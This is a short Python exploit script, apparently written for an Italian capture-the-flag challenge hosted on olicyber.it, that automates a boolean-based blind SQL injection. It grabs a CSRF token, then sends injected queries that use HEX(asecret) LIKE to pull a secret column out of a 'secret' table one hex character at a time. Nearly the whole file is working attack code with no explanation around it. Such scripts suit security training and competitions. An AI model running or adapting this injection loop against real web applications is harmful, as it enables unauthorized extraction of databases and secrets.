import requests
import re

class Inj:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.api_url = f"{base_url}/api/blind"
        self.token = self._get_token()

    def _get_token(self):
        # Estrae il CSRF token dalla pagina principale
        r = self.session.get(f"{self.base_url}/blind")
        match = re.search(r"csrf_token\s*=\s*'([^']+)';", r.text)
        if match:
            token = match.group(1)
            # Aggiorna gli header della sessione per le chiamate successive
            self.session.headers.update({"X-CSRFToken": token})
            return token
        return None

    def blind(self, query):
        payload = {"query": query}
        try:
            # Invio della query in formato JSON
            r = self.session.post(self.api_url, json=payload)
            data = r.json()
            # Adatta 'Success' in base alla risposta reale del server (es. 'result' o 'status')
            if data.get("result") == "Success":
                return "Success", None
            return "Failure", None
        except Exception as e:
            return None, str(e)


# --- Inizio Bruteforce ---

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

print("Avvio estrazione (HEX)...")

while True:
    found_char = False
    for c in dictionary:
        # Costruzione della query blind
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result + c}%')='1"
        
        response, error = inj.blind(question)
        
        if response == 'Success':
            result += c
            print(f"Trovato: {result}")
            found_char = True
            break 
    
    if not found_char:
        break

print(f"\nRisultato finale (HEX): {result}")
try:
    print(f"Risultato convertito: {bytes.fromhex(result).decode('utf-8')}")
except:
    print("Impossibile convertire l'HEX in stringa leggibile.")